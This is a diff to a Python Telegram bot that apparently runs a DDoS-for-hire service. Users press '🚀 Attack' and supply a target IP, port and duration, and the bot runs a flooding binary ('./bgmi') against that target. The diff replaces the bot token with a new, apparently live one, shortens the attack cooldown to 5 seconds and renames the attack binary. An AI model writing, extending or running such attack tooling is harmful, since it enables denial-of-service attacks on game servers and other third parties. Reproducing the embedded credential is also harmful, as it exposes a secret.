@@ -17,7 +17,7 @@ import subprocess
 
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('7725999486:AAEkC2QTTYUFunOiWE44TyFXMncs8m2TCao')
+bot = telebot.TeleBot('7817127297:AAH5YxL7Rv1_0b-SwdcD9Y0fWjCU7_xdnVc')
 
 # Admin user IDs
 admin_id = {"7086729173"}
@@ -305,7 +305,7 @@ def start_command(message):
         f"*➖𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗹𝗲𝗰𝘁 𝗮𝗻 𝗼𝗽𝘁𝗶𝗼𝗻 𝗳𝗿𝗼𝗺 𝗯𝗲𝗹𝗼𝘄 👀* ",
         parse_mode='Markdown'
     )
-COOLDOWN_PERIOD = 60  # 1 minutes
+COOLDOWN_PERIOD = 5  # 1 minutes
 @bot.message_handler(func=lambda message: message.text == "🚀 Attack")
 def handle_attack(message):
     user_id = str(message.chat.id)
@@ -353,7 +353,7 @@ def process_attack_details(message):
                 # Record and log the attack
                 record_command_logs(user_id, 'attack', target, port, time)
                 log_command(user_id, target, port, time)
-                full_command = f"./aaaaaa {target} {port} {time} 900"
+                full_command = f"./bgmi {target} {port} {time} 900"
                 username = message.chat.username or "No username"
                 # Send immediate response that the attack is being executed
                 response = f"‼️ 𝗛𝗲𝗹𝗹𝗼 @{username},  𝗬𝗼𝘂𝗿 𝗔𝘁𝘁𝗮𝗰𝗸 𝗼𝗻  {target} : {port} 𝘄𝗶𝗹𝗹 𝗯𝗲 𝗳𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗶𝗻 {time} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 . \n\n𝗣𝗲𝗮𝗰𝗲𝗳𝘂𝗹𝗹𝘆 𝘄𝗮𝗶𝘁 𝗶𝗻 𝗣𝗟𝗔𝗡𝗘  / 𝗟𝗢𝗕𝗕𝗬 𝘄𝗶𝘁𝗵𝗼𝘂𝘁 𝘁𝗼𝘂𝗰𝗵𝗶𝗻𝗴 𝗮𝗻𝘆 𝗕𝘂𝘁𝘁𝗼𝗻 ‼"
